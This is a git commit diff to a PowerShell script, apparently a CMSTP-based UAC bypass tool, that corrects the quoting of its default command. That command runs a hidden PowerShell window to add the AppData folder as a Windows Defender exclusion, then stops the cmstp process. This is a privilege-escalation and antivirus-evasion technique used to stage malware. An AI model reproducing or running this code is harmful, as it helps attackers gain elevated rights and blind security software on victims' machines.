563fb9e71a14b235dd933911d3803b5d98479679
Morbilans <75447947+Morbilans@users.noreply.github.com>
2021-05-26 14:50:33 -0400

    Update uacchim.ps1

--- uacchim.ps1
+++ uacchim.ps1
@@ -5,7 +5,7 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath $env:Appdata';Stop-Process -Name "cmstp"
+	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath $env:Appdata;Stop-Process -Name "cmstp"'
 	)
 
 $InfContent = @"
